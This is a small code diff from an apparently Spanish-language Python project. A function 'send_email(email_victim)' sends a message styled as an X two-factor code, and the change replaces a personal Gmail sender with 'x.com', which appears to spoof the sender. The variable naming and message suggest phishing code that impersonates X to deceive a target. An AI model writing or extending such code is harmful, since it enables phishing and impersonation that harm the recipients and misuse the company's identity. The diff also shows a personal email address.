@@ -14,7 +14,7 @@ def send_email(email_victim):
     send = send_mail(
         "Código 2FA de X",
         "Tu código 2FA es: " + str(code_2fa),
-        "jcng.aa135@gmail.com",
+        "x.com",
         [email_victim],
     )
 
